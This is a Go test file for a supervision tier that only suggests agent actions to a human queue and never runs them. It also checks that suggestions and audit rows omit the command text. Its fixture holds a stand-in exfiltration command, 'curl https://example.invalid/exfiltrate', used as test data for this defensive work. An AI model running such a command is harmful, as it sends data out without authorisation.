package supervision

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/acamarata/cascade/internal/policy"
	"github.com/acamarata/cascade/pkg/cascade"
)

// Purpose (this file): tier 3's single guarantee — it never executes —
//   asserted with a spy executor that must record zero calls, and the
//   disclosure rules around what a suggestion may carry.
// SPORT: fleet.supervision tier-3 tests (ADD) — P1-E18-W4-S39-T3.

// spyExecutor counts calls it must never receive.
type spyExecutor struct{ calls int }

func (e *spyExecutor) Execute(context.Context, policy.EvalRequest) error {
	e.calls++
	return nil
}

// tier3Request is the action under test. The command text is distinctive
// so the disclosure assertions cannot pass by coincidence.
func tier3Request() policy.EvalRequest {
	return policy.EvalRequest{
		Subject:    policy.Subject{Kind: policy.SubjectAgent, ID: "agent-3"},
		Capability: "hooks.shell",
		Verb:       "vault.get",
		Action:     "curl https://example.invalid/exfiltrate",
		Attributes: map[string]string{"ref": "act-tier3"},
	}
}

// TestTierThreeNeverExecutes is the acceptance criterion, asserted the way
// the contract states it: a spy executor with a call count of zero.
//
// The executor is never handed to the supervisor at all, which is the
// point — the guarantee is structural. A tier that held an executor and
// chose not to call it would be one edit away from calling it.
func TestTierThreeNeverExecutes(t *testing.T) {
	ctx := context.Background()
	spy := &spyExecutor{}
	queue := &capturingAttention{}
	s := NewTier3Supervisor(queue, &capturingAudit{})

	for i := 0; i < 3; i++ {
		if _, err := s.Suggest(ctx, tier3Request(), policy.EvalOutcome{Level: policy.L4}); err != nil {
			t.Fatalf("suggest %d: %v", i, err)
		}
	}
	if spy.calls != 0 {
		t.Fatalf("the executor was called %d times; tier 3 never executes", spy.calls)
	}
	if len(queue.items) != 3 {
		t.Errorf("%d suggestions queued for 3 actions, want one each", len(queue.items))
	}
	if s.Tier() != TierSuggestOnly {
		t.Errorf("Tier() = %v, want tier 3", s.Tier())
	}
}

// TestTheSuggestionNamesTheActionWithoutQuotingIt holds the disclosure
// rule. A suggestion list is read at leisure, which makes it exactly the
// wrong place to accumulate a second copy of every command the fleet
// wanted to run.
func TestTheSuggestionNamesTheActionWithoutQuotingIt(t *testing.T) {
	ctx := context.Background()
	trace := &capturingAudit{}
	s := NewTier3Supervisor(&capturingAttention{}, trace)

	sg, err := s.Suggest(ctx, tier3Request(), policy.EvalOutcome{
		Level: policy.L3, Reason: "L3 needs a human",
	})
	if err != nil {
		t.Fatal(err)
	}
	if sg.Ref != "act-tier3" {
		t.Errorf("Ref = %q, want the action's own ref", sg.Ref)
	}
	if sg.RiskLevel != policy.L3.String() {
		t.Errorf("RiskLevel = %q, want the rung the engine resolved", sg.RiskLevel)
	}
	if sg.Rationale != "L3 needs a human" {
		t.Errorf("Rationale = %q, want the engine's own reason", sg.Rationale)
	}
	if sg.ParamsHash == "" {
		t.Error("ParamsHash is empty; the suggestion is not bound to the action's parameters")
	}

	encoded, err := json.Marshal(sg)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(encoded), "exfiltrate") {
		t.Errorf("the suggestion carries the command text: %s", encoded)
	}
	if len(trace.events) != 1 {
		t.Fatalf("%d trace rows, want 1", len(trace.events))
	}
	if strings.Contains(string(trace.events[0].Explain), "exfiltrate") {
		t.Errorf("the trace row carries the command text: %s", trace.events[0].Explain)
	}
}

// TestAFailedFileIsReportedButNothingRan holds the honest failure. If the
// queue refuses, the operator will never see the suggestion — that must be
// reported. What must NOT change is that the action did not run, and the
// error says so in as many words.
func TestAFailedFileIsReportedButNothingRan(t *testing.T) {
	ctx := context.Background()
	s := NewTier3Supervisor(refusingAttention{}, nil)

	sg, err := s.Suggest(ctx, tier3Request(), policy.EvalOutcome{Level: policy.L2})
	if !cascade.HasKind(err, cascade.KindUnavailable) {
		t.Fatalf("err = %v, want KindUnavailable", err)
	}
	if !strings.Contains(err.Error(), "NOT run") {
		t.Errorf("err = %q, want it to say plainly that the action did not run", err)
	}
	// The suggestion is still returned, so a caller can log or retry the
	// filing without re-deriving it.
	if sg.Ref == "" {
		t.Error("a failed file returned no suggestion at all")
	}
}

// TestTierThreeWorksWithNothingWired is the degrade. The safest tier must
// be the one most likely to start: a constructor that refused without a
// queue would make a misconfigured daemon fall back to a LESS supervised
// tier, which is the wrong direction for this mistake.
func TestTierThreeWorksWithNothingWired(t *testing.T) {
	ctx := context.Background()
	s := NewTier3Supervisor(nil, nil)
	if _, err := s.Suggest(ctx, tier3Request(), policy.EvalOutcome{Level: policy.L4}); err != nil {
		t.Errorf("suggest with nothing wired: %v", err)
	}
}

// refusingAttention refuses every push.
type refusingAttention struct{}

func (refusingAttention) Push(context.Context, AttentionItem) (AttentionItem, error) {
	return AttentionItem{}, cascade.New(cascade.KindUnavailable, "queue: unreachable")
}
